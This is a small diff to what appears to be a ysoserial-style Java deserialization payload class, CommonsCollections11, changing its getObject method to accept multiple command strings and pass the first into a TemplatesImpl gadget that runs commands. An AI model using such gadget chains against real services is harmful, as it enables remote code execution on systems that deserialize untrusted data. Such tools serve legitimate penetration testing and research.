@@ -36,8 +36,8 @@ java.security.manager off OR set jdk.xml.enableTemplatesImplDeserialization=true
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 public class CommonsCollections11  extends PayloadRunner implements ObjectPayload<HashSet> {
 
-    public HashSet getObject(final String command) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(command);
+    public HashSet getObject(final String ... command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command[0]);
         // mock method name until armed
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
